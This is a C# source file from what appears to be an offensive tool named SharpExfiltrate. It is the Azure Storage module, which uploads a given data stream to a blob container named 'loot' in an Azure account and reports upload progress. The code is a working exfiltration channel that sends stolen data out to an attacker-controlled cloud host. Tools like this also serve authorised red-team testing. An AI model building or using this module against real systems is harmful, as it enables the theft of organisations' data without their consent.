using Microsoft.WindowsAzure.Storage;
using Microsoft.WindowsAzure.Storage.Blob;
using Microsoft.WindowsAzure.Storage.Core.Util;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SharpExfiltrate.Modules
{
    public class AzureStorage
    {
        public AzureStorage(string connectionString)
        {
            this.cloudStorageAccount = CloudStorageAccount.Parse(connectionString);

            blobClient = cloudStorageAccount.CreateCloudBlobClient();

            this.lootCloudContainer = blobClient.GetContainerReference("loot");
        }

        private CloudStorageAccount cloudStorageAccount { get; set; }
        private CloudBlobClient blobClient { get; set; }
        private CloudBlobContainer lootCloudContainer { get; set; }

        private string FileName { get; set; }
        private long StreamSize { get; set; }
        private int ProgressCount { get; set; }


        private void UploadProgressChanged(object sender, StorageProgress progress)
        {

            //Only show every 60 progress update, Azure spams!
            if (ProgressCount == 60)
            {
                int progressValue = (int)((float)((float)progress.BytesTransferred / (float)StreamSize) * (float)100.00);

                Console.WriteLine($"[+] Uploading {FileName} {Helpers.Compression.BytesToString(progress.BytesTransferred)} - " + progressValue + "%");
                ProgressCount = 0;
            }
            else
            {
                ProgressCount++;
            }

        }


        public async Task<string> UploadFile(Stream stream, string filename)
        {
            ProgressCount = 0;
            StreamSize = stream.Length;
            FileName = filename;
            CancellationToken cancellationToken = new CancellationToken();

            CloudBlockBlob cloudBlockBlob = lootCloudContainer.GetBlockBlobReference(filename);

            await lootCloudContainer.CreateIfNotExistsAsync();

            var progressHandler = new Progress<StorageProgress>();
            progressHandler.ProgressChanged += UploadProgressChanged;


            await cloudBlockBlob.UploadFromStreamAsync(stream,
                    default(AccessCondition),
                    default(BlobRequestOptions),
                    default(OperationContext),
                    progressHandler,
                    cancellationToken
                    );


            Console.WriteLine($"[+] Upload completed, file located: {cloudBlockBlob.Uri.ToString()} ");

            return cloudBlockBlob.Uri.ToString();
        }


    }
}
